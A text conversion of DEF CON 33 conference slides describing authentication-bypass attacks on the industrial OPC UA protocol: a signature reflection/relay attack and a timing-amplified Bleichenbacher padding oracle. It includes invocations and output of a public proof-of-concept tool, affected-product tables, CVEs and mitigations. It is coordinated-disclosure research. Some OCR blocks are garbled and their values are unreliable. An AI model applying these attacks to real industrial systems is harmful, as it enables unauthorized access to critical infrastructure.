---
title: "No VPN Needed Cryptographic Attacks Against the OPC UA Protocol"
speakers: ["Tom Tervoort"]
conference: "DEF CON"
conference_full: "DEF CON 33"
edition: "33"
year: 2025
source_pdf: "DEF CON 33/Tom Tervoort - No VPN Needed Cryptographic Attacks Against the OPC UA Protocol.pdf"
pages: 31
sha256: "4e5b6d74d30190850312d92cc3bb5860930320b2c5499fe2d817cb776171a816"
text_chars: 15751
ocr_pages: 12
has_ocr: true
redacted_secrets: 0
ocr_confidence: 90.7
ocr_unreliable_blocks: 3
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T07:16:27Z"
---
# No VPN Needed Cryptographic Attacks Against the OPC UA Protocol

**Speakers:** Tom Tervoort  
**Conference:** DEF CON 33  
**Source:** `DEF CON 33/Tom Tervoort - No VPN Needed Cryptographic Attacks Against the OPC UA Protocol.pdf` (31 pages)


## Slide 1

**No VPN Needed? Cryptographic Attacks Against the OPC UA Protocol Tom Tervoort**

## Slide 2

# Speaker intro

- Pentester/consultant for Bureau Veritas Cybersecurity

- Specialization: pwning things via (weird) crypto bugs

- Found ‘Zerologon’ vulnerability; now get to go to conferences a lot

## Slide 3

# Outline

**What is OPC UA? OPC UA Cryptography Attack 1: signing oracle auth bypass Attack 2: padding oracle auth bypass Follow-up and conclusions**

## Slide 4

# What is OPC UA?

Photos by Magda Ehlers, Tom Fisk, Pixabay, Mattcmoi

## Slide 5

Why investigate it?


> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Why investigate it?
OPC UA
Important More exposed
thing thing
OPC UA connections are secure in itself, hence generally there is no need for VPN in an OPC UA network
solution. In the past VPN tunnel for secure transmission and remote desktop connections were
used, but OPC UA includes encrypted transmission and adds user authentication and audit
« Secure: OPC UA is highly secure due to its encryption, authentication, checksums, data access, and authorization capabilities.
OPC-UA doesn't require a VPN, and the gateway enables a secure connection for outgoing data to the cloud when the
gateway is established. OPC-UA can also be used in the cloud and at the edge.
```

## Slide 6

# OPC UA security

**Client/server authentication:** X.509 certificates **User authentication:** password, JWT, cert, etc. Can have **both** , **either** or **neither**

**Trust models:** pre-configured, first-time approval, PKI Security Mode, user authentication method, and ciphers are **negotiated** between client and server

|**Security Mode**|**Client/Server Auth**|**Integrity**|**Confidentiality**|
|---|---|---|---|
|None|✗|✗|✗|
|Sign|✓|✓|✗|
|SignAndEncrypt|✓|✓|✓|

Image by OPC Foundation

## Slide 7

# Secure channel handshake

**(simplified)**

|**Security Policy**|**Encryption scheme**|**Signing scheme**|
|---|---|---|
|None|-|-|
|Basic128Rsa15|RSA PKCS#1v1.5|SHA1 + RSA PKCS#1v1.5|
|Basic256|RSA-OAEP-SHA1|SHA1 + RSA PKCS#1v1.5|
|Basic256Sha256|RSA-OAEP-SHA1|SHA256 + RSA PKCS#1v1.5|
|Aes128_Sha256_RsaOaep|RSA-OAEP-SHA1|SHA256 + RSA PKCS#1v1.5|
|Aes256_Sha256_RsaPss|RSA-OAEP-SHA256|SHA256 + RSA-PSS|

Also various ECC policies; rarely used yet

## Slide 8

# Session handshake

- Symmetric crypto based on AES and HMAC

- Challenge signing with same certificates as channel phase

- Password-based user auth: encrypt password with server public key, even with None policy

- Certificate-based user auth: sign same server challenge with “user certificate”

- Session bound to channel + key

- Very inefficient protocol: three expensive RSA decrypt/sign operations on each side! But is it secure?

## Slide 9

# Attacking the session handshake

**In server’s CreateSessionResponse:**

### **In client’s ActivateSessionResponse:**

**Looks rather similar…**

## Slide 10

Signing oracle “relay attack”


> Recovered by OCR — confidence 90/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Signing oracle “relay attack”
OPC Server A
Attacker
CreateSessionRequest }|——— |
Identity: server B
ClientNonce: ...
CreateSessionResponse
ServerNonce: N
ServerSignature: ... >
ActivateSessionRequest |<
ClientSignature: <sig over
A cert + N with B's public
key>
ActivateSessionResponse
Result:
OPC Server B
CreateSessionRequest
Identity: server A
ClientNonce: N ae,
CreateSessionResponse
ServerNonce: ...
ServerSignature: <sig over A
cert + N with B's public key>
```

## Slide 11

Even better: “reflection attack”

## Slide 12

But we still need to defeat this…


> Recovered by OCR — confidence 94/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
But we still need to defeat this...
OPC Client OPC Server
- Client certificate
signed with client private key:
- Random "client nonce oe
- Encrypted with client public key and
Gy - Random "server nonce"
- Channel Token
Both sides derive session keys from nonces
```

## Slide 13

# …or we just skip it

OPC UA over HTTPS

- Skips secure channel handshake, because TLS already offers transport crypto

- No TLS client certs; **relies on session layer for client authentication**

## Slide 14

# PoC or it didn’t happen

**https://github.com/SecuraBV/opcattack**


> Recovered by OCR — confidence 90/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
PoC or it didn’t happen
sardvarksoep: $ python3 opcattack.py reflect https://opc-testserver:62540/
Attempting reflection attack against https://opc-testserver:62540/
Server advertises 7 endpoints.
Targeting https://opc-testserver :62540/Quickstarts/ReferenceServer/ with BASIC256SHA256 security policy.
User certificate required. Reusing the server certificate to forge user token.
Attack succesfull! Authenticated session set up with https://opc-testserver:62540/Quickstarts/ReferenceServer/.
Trying to browse data via authenticated channel.
Tree:
+ <root>
|+ Objects (OBJECT)
|+ Server (OBJECT)
|+ ServerArray (Array):
|+ ServerArray: "“urn:aardvarksoep:UA:Quickstarts:ReferenceServer"
|+ NamespaceArray (Array):
|+ NamespaceArray: "http://opcfoundation.org/UA/"
|+ NamespaceArray: "urn:aardvarksoep:UA:Quickstarts:ReferenceServer"
|+ NamespaceArray: "http://test.org/UA/Data/"
|+ NamespaceArray: "http://test.org/UA/Data/Instance"
|+ NamespaceArray: "http://opcfoundation.org/UA/Boiler/"
|+ NamespaceArray: "http://opcfoundation.org/UA/Boiler/Instance"
|+ NamespaceArray: "http://test.org/UA/Alarms/"
|+ NamespaceArray: "http://test.org/UA/Alarms/Instance"
|+ NamespaceArray: "http://opcfoundation.org/UA/Diagnostics"
|+ NamespaceArray: "http://samples.org/UA/MemoryBuffer"
|+ NamespaceArray: "http://samples.org/UA/MemoryBuffer/Instance"
|- ServerStatus: <decode error> ("Extension object type ID 864 not registered.")
|- ServiceLevel: "255"
|
|
- Auditing: "True"
- EstimatedReturnTime: "None"
https://github.com/SecuraBV/opcattack
```

## Slide 15

# Idea to attack OPC over TCP: the 1998 classic

**Security Policy Encryption scheme Signing scheme** - - None Basic128Rsa15 RSA PKCS#1v1.5 SHA1 + RSA PKCS#1v1.5 Basic256 RSA-OAEP-SHA1 SHA1 + RSA PKCS#1v1.5 Basic256Sha256 RSA-OAEP-SHA1 SHA256 + RSA PKCS#1v1.5 A 128 Sh 256 R O RSA OAEP SHA1 SHA256 RSA PKCS#1 1 5

## Slide 16

# Deprecated?

## However:

- Many implementations allow Basic128Rsa15 by default anyway

- Some implementations attempt to decrypt PKCS#1 ciphertext before checking if Basic128Rsa15 is enabled

- Software updates won’t change existing configurations

- Risks not clear to user; problem is not SHA1

- **OAEP also insecure when keys are reused for PKCS#1**

## Slide 17

# Bleichenbacher’s attack **(simplified)**

RSA encryption: RSA padding: message bytestring -> integer m PKCS#1 padding: Server padding check fails: m has different format Otherwise: m starts with 0x02; information on message is leaked Attack: send specifically chosen c values, and observe which decrypt to an m with correct padding. Narrow down exact value of m after +/- 1,000,000 queries to the “padding oracle”.

## Slide 18

# Two private key operations

Note: Bleichenbacher attack can also **spoof signatures** because RSA signing ≈ RSA decryption


> Recovered by OCR — confidence 92/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Two private key operations
OPC Client OPC Server
- Client certificate
signed with client private key: >
- Random "client nonce oe
- Encrypted with client public key and
is Zl spoof signatures because RSA
signing = RSA decryption
Both sides derive session keys from nonces 4
```

## Slide 19


> Recovered by OCR — confidence 86/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
OPC Server
Attacker
Attacker's client nonce
Bleichenbacher attack
I< >|
I< >
I< >|
I< >
I< >|
I< >|
Ey spoofed!
- Server's own certificate
- Message with spoofed signature
encrypted with server public key:
Attacker's client nonce ae
ZN
2222222
Bleichenbacher attack
I< >
I< >|
I< >|
- Random "server nonce" decrypted!
- Channel Token :
Can compute 4
```

## Slide 20

# Error-based padding oracle

- Different behaviour per implementation

- • For some padding errors can be distinguished; for others they are identical to signature errors (which occur after decrypting an invalid message)

## Slide 21

# Timing-based padding oracle **Maybe valid padding has a different response time?**

**But aren’t timing attacks hard and impractical? Sounds complicated…**

Images by Yarom et al., Brumley et al., Andrey Grushnikov

## Slide 22

# A timing “side channel amplifier”

**“ECB” RSA decryption in OPC UA:**

Idea: repeat same ciphertext block e.g. 100 times Bad padding: do 1 decrypt; then fail Good padding **do 100 decrypts** ; then fail

ECB Penguin by Filippo Valsorda

## Slide 23

# Timing attacks made easy

Highly sophisticated false positive elimination model:


> Recovered by OCR — confidence 93/100 on the text kept, 89/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Timing attacks made easy
: good padding; H
97: good padding; time: 0.10941171646118164
98: bad padding; time: 0.0047380924224853516
99: bad padding; time: 0.005006074905395508
100: bad padding; time: 0.004828214645385742
Timing experiment results:
Expansion parameter 10:
Average time with correct padding: 0.018887882232666017
Average time with incorrect padding: 0.005357732772827148
Shortest time with correct padding: 0.016694307327270508
Longest time with incorrect padding: 0.022701740264892578
Expansion parameter 30:
Average time with correct padding: 0.03950897693634033
Average time with incorrect padding: 0.005196962356567383
Shortest time with correct padding: 0.035872697830200195
Longest time with incorrect padding: 0.011386394500732422
Expansion parameter 50:
Average time with correct padding: 0.06519682884216309
Average time with incorrect padding: 0.005134844779968261
Shortest time with correct padding: 0.05526590347290039
Longest time with incorrect padding: 0.009844779968261719
Expansion parameter 100:
Average time with correct padding: 0.1187872519683838
Average time with incorrect padding: 0.00542763729095459
Shortest time with correct—paddinga: 0.19398173332214355
Longest time with incorrect padding: 0.013846635818481445
Highly sophisticated false positive elimination model:
duration Ss
i rang
start = tim
self. base.
duration
duration
elf. threshold:
e(0, self. repeats):
time. time() start
self. threshold:
```

## Slide 24

Wait for it…


> Recovered by OCR — confidence 91/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Server advertises 11 endpoints. .
Trying sigforge attack to produce OPN signature. . “O0-
Checking 11 endpoints of opc.tcp://opc-testserver:4840 for RSA padding oracle. total: (000:00:02.300 _ record | zero
Endpoint "opc.tcp://opc-testserver:4840" qualifies for OPN oracle. lap: 000:00:02.300 — record | zero
*] Starting padding oracle attack...
|] Progress: iteration 0; interval size: 4.93E+611; oracle queries: 111
```

## Slide 25

Wait for it…


> Recovered by OCR — confidence 91/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Server advertises 11 endpoints. .
Trying sigforge attack to produce OPN signature. . “O0-
Checking 11 endpoints of opc.tcp://opc-testserver:4840 for RSA padding oracle. total: 000:00:21.283 _ record | zero
Endpoint "opc.tcp://opc-testserver:4840" qualifies for OPN oracle. lap: 000:00:21.283 — record | zero
[*] Starting padding oracle attack...
[\] Progress: iteration 1; interval size: 4.93E+611; oracle queries: 3686
```

## Slide 26

Wait for it…


> Recovered by OCR — confidence 92/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Server advertises 11 endpoints.
Trying sigforge attack to produce OPN signature. . “OA:
Checking 11 endpoints of opc.tcp://opc-testserver:4840 for RSA padding oracle. total: 000:04:57.302 _ record | zero
Endpoint "opc.tcp://opc-testserver:4840" qualifies for OPN oracle. lap: 000:04:57.302 record | zero
*] Starting padding oracle attack...
fl ] Progress: iteration 252; interval size: 2.94E+531; oracle queries: 49323
```

## Slide 27

Got the signature, and…


> Recovered by OCR — confidence 92/100 on the text kept, 69/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Got the signature, and...
[*] Continuing with Timing-based OPN padding oracle for endpoint opc.tcp://opc-testserver :4840.
[*] Padded hash of payload: Ooo1fffFFFFFTTTTTTrFFFFTTTftrrrrrrrrrrtfrrrrrrrrrrrrttrrrrrrrrrrrtttrrrrrrrrrrrtrrrrrrrrrrrrrrrrrrrrrrrrrrrtrrrrrrrrrrrrrrrrrrrrrrrrrrttttttt
[*] Starting padding oracle attack...
[\] Progress: iteration 2016; interval size: 2.00E+0; oracle queries: 5586985
[+] Succes! Forged signature:
[*] Message bytes after applying encryption: 4f504e46290600000000000038000000687474703a2f2f6f7063666f756e646174696f 6e2e6f 72672f55412F5365637572697479506F6c6963792342617369
Storing signed+encrypted OPN request in cache file .opncache. json.
Picking a padding oracle for decryption. lap:|000:08:30.788 record | zero
Checking 11 endpoints of opc.tcp://opc-testserver:4840 for RSA padding oracle.
Endpoint “opc.tcp://opc-testserver:4840" qualifies for OPN oracle.
Trying a bunch of known plaintexts to assess OPN oracle quality and reliability
Progress: [
Base OPN not working. Testing timing-based variant (threshold: 0.02 seconds); this may take a minute.
Progress:
Timing-based OPN padding oracle score: 100/100
Continuing with Timing-based OPN padding oracle for endpoint opc.tcp://opc-testserver :4840.
Performing the OPN handshake...
Forged OPN request was accepted. Now keeping this session open while decrypting the first block of the response.
Progress: iteration 1; interval size: 4.93E+611; oracle queries: 165
```

## Slide 28

There we go!


> Recovered by OCR — confidence 85/100 on the text kept, 81/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
There we go!
[/] Progress: iteration 2016; interval size: 2.00E+0; oracle queries: 3470896
[+] Success! Got the following plaintext: 0002198568a3410e38090001000000010000000100c10199e6 7ca6dce5db019000000000000000000F FFT fff FO0000000000000cef500000800000099e67caédce.
[[*] Removed padding. Now parsing OpenSecureChannelResponse to extract channel ID and secret nonce:
+ openSecureChannelResponse (OpenSecureChannelResponse):
|+ typeId (NodeId):
|+ namespace: 0
|+ identifier: 449
|+ responseHeader (ResponseHeader ):
|+ timeStamp: 2025-06-25 14:22:58.633000
|+ requestHandle: 0
|+ serviceResult: 0
|+ serviceDiagnostics: NULL
|+ stringTable: []
|+ additionalHeader: NULL
|+ serverProtocolVersion: 0
|+ securityToken (ChannelSecurityToken):
|+ channelId: 62926
|+ tokenId: 8
|+ createdAt: 2025-06-25 14:22:58.633000
|+ revisedLifetime: 600000
|+ serverNonce: 2e89a0353dac65db5a7dfd055942c834
Trying reflection attack (if channel is still alive).
Creating first session on login endpoint (opc.tcp://opc-testserver : 4840)
Got server nonce: b'e9fc274d68bae227244d76e6db48ef 9d2e31311b6F3712c20039d434F8434bc7 '
Forwarding nonce to second session on impersonate endpoint (opc.tcp://opc-testserver : 4840)
] Got signature over nonce: b'777fc6cbb269b7fbbd8407133a70a8570dd43e1ec8a706915a94ad3971306748fdf990F064b13F12f511e2e032¢c405374e58e59c5a76b42d048dcadfd55c9F521f429d67d9C
[*] Using signature log in to opc.tcp://opc-testserver : 4840.
[+] Attack succesfull! Authenticated session set up with opc.tcp://opc-testserver:4840. stopwatch
*] Trying to browse data via authenticated channel. .
[*] Ue File Edit Run Help
© OGRE total: 000:15:30.502 record | zero
|- FolderType (OBJECTTYPE)
|+ Objects (OBJECT) lap: 000:15:30.502 record | zero
|- FolderType (OBJECTTYPE)
|+ Server (OBJECT)
|- ServerType (OBJECTTYPE)
|- Auditing: "False"
|- ServiceLevel: "255"
|+ NamespaceArray (Array):
|+ NamespaceArray: "http://opcfoundation.org/UA/"
|+ NamespaceArray: "“urn:open62541.server.application”
|+ ServerArray (Array):
|+ ServerArray: "“urn:open62541.server.application"
|+ ServerRedundancy (OBJECT)
|- ServerRedundancyType (OBJECTTYPE)
|- RedundancySupport: "0"
|+ VendorServerInfo (OBJECT)
```

## Slide 29

# Tested implementations

|**Software**|**Tested version**|**HTTPS attack**|**Error-based padding**
**oracle**|**Timing-based padding**
**oracle**|
|---|---|---|---|---|
|dataFEED edgeConnecto|r 2024.01|✗|✗|✗|
|Ignition|8.1.38|✗|✓|✓|
|KEPServerEX|6.15.154.0|✗|✗|✓*****|
|open62541|1.4|✗|✗|✓|
|Prosys OPC UA
Simulation Server|5.4.6-180|✓|✓|✓|
|UA-.NETStandard||✓|✓*****|✓*****|
|Reference Server|1.4.372-preview||||
|Unified Automation C++
Demo Server|1.8.2.624|✗|✗|✗|

* Only in non-default configuration

Protocol flaw -> others likely affected Got confirmation about CODESYS and various Siemens products

## Slide 30

# Follow-up

- Disclosed to OPC Foundation; who coordinated to vendors

- Very fast response!

- CVE’s so far: CVE-2024-42512, CVE-2024-42513, CVE-2025-1468

- Fixes range from software updates to disabling features to configuration advisories

- Check your vendor documentation

- Non-certificate based user authentication is not affected

- Disabling HTTPS and Basic128Rsa15 is usually sufficient, but not always

- Testing and PoC exploitation tool: **https://github.com/SecuraBV/opcattack**

## Slide 31

# Takeaways

1. Crypto protocol design is hard, even if you use secure building blocks

2. More than a quarter century later, Bleichenbacher's attack is as relevant as ever.

3. We can probably expect more OPC UA crypto flaws to surface in the future.

- So do you need to go back to use a VPN? Well..

Image by Sinh Tran
